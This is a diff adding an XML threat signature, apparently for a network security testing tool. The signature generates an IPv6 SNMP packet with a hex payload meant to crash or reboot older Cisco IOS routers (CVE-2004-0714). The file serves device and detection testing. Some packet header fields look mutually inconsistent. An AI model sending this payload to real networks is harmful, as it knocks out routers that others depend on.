@@ -1,0 +1,135 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco IOS Solicited SNMP Message Crash (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat fires a solicited SNMP message to port 162 of the target machine.  This will cause a crash/reboot in older versions of Cisco IOS. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SNMP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Cisco_IOS"/>
+      <item value="Cisco_ONS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Cisco_IOS_12.3_XQ"/>
+      <item value="Cisco_IOS_12.3_XK"/>
+      <item value="Cisco_IOS_12.3_XH"/>
+      <item value="Cisco_IOS_12.3_XG"/>
+      <item value="Cisco_IOS_12.3_XF"/>
+      <item value="Cisco_IOS_12.3_XE"/>
+      <item value="Cisco_IOS_12.3_XD"/>
+      <item value="Cisco_IOS_12.3_XC"/>
+      <item value="Cisco_IOS_12.3_T"/>
+      <item value="Cisco_IOS_12.3_B"/>
+      <item value="Cisco_IOS_12.3_(6)"/>
+      <item value="Cisco_IOS_12.3_(5b)"/>
+      <item value="Cisco_IOS_12.3_(5a)b"/>
+      <item value="Cisco_IOS_12.3_(5a)"/>
+      <item value="Cisco_IOS_12.3_(5)"/>
+      <item value="Cisco_IOS_12.3_(4)XD1"/>
+      <item value="Cisco_IOS_12.3_(4)XD"/>
+      <item value="Cisco_IOS_12.3_(4)T3"/>
+      <item value="Cisco_IOS_12.3_(4)T2"/>
+      <item value="Cisco_IOS_12.3_(4)T1"/>
+      <item value="Cisco_IOS_12.3_(4)T"/>
+      <item value="Cisco_IOS_12.3_(2)XC2"/>
+      <item value="Cisco_IOS_12.3_(2)XC1"/>
+      <item value="Cisco_IOS_12.3_(2)T3"/>
+      <item value="Cisco_IOS_12.3"/>
+      <item value="Cisco_IOS_12.2_ZQ"/>
+      <item value="Cisco_IOS_12.2_SW"/>
+      <item value="Cisco_IOS_12.2_S"/>
+      <item value="Cisco_IOS_12.2_(23)"/>
+      <item value="Cisco_IOS_12.2_(21a)"/>
+      <item value="Cisco_IOS_12.2_(21)"/>
+      <item value="Cisco_IOS_12.2_(20)S1"/>
+      <item value="Cisco_IOS_12.2_(20)S"/>
+      <item value="Cisco_IOS_12.2_(12h)"/>
+      <item value="Cisco_IOS_12.2_(12g)"/>
+      <item value="Cisco_IOS_12.2"/>
+      <item value="Cisco_IOS_12.1_EW"/>
+      <item value="Cisco_IOS_12.1_EU"/>
+      <item value="Cisco_IOS_12.1_EO"/>
+      <item value="Cisco_IOS_12.1_EC"/>
+      <item value="Cisco_IOS_12.1_EB"/>
+      <item value="Cisco_IOS_12.1_EA"/>
+      <item value="Cisco_IOS_12.1_E"/>
+      <item value="Cisco_IOS_12.1_(20)EW1"/>
+      <item value="Cisco_IOS_12.1_(20)EW"/>
+      <item value="Cisco_IOS_12.1_(20)EC1"/>
+      <item value="Cisco_IOS_12.1_(20)EC"/>
+      <item value="Cisco_IOS_12.1_(20)EA1"/>
+      <item value="Cisco_IOS_12.1_(20)E2"/>
+      <item value="Cisco_IOS_12.1_(20)E1"/>
+      <item value="Cisco_IOS_12.1_(20)E"/>
+      <item value="Cisco_IOS_12.0_SV"/>
+      <item value="Cisco_IOS_12.0_S"/>
+      <item value="Cisco_IOS_12.0_(27)SV1"/>
+      <item value="Cisco_IOS_12.0_(27)SV"/>
+      <item value="Cisco_IOS_12.0_(27)S"/>
+      <item value="Cisco_IOS_12.0_(26)S1"/>
+      <item value="Cisco_IOS_12.0_(24)S5"/>
+      <item value="Cisco_IOS_12.0_(24)S4"/>
+      <item value="Cisco_IOS_12.0_(23)S5"/>
+      <item value="Cisco_IOS_12.0_(23)S4"/>
+      <item value="Cisco_IOS_12.1(20)EO"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.cisco.com/warp/public/707/cisco-sa-20040420-snmp.shtml"/>
+    <CVEID display="true" value="CVE-2004-0714"/>
+    <bugtraqID display="true" value="10186"/>
+    <OSVDB display="true" value="5575"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="7d96c39a9adc98a9f1bed153b0b0823b" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1236794574"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1146024517" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="302902010004067075626c6963a01c020437b41e57020100020100300e300c06082b060102010101000500"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
